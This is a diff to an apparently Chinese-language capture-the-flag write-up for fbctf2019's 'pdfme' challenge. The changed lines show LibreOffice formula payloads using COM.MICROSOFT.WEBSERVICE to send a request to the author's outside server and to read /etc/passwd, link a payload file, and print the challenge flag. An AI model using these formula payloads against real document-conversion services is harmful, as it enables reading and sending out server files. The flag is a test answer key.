@@ -12,7 +12,7 @@
 
 `=COM.MICROSOFT.WEBSERVICE(&quot;http://kaibro.tw/x&quot;)` => send http request to my server
 
-`COM.MICROSOFT.WEBSERVICE(&quot;/etc/passwd&quot;)` => read `/etc/passwd` file
+`=COM.MICROSOFT.WEBSERVICE(&quot;/etc/passwd&quot;)` => read `/etc/passwd` file
 
 組合起來
 
@@ -26,4 +26,4 @@
 
 flag: `fb{wh0_7h0u6h7_l1br30ff1c3_c4n_b3_u53ful}`
 
-詳細見payload: flag.fods
+詳細見payload: [flag.fods](https://github.com/w181496/CTF/blob/master/fbctf2019/pdfme/flag.fods)
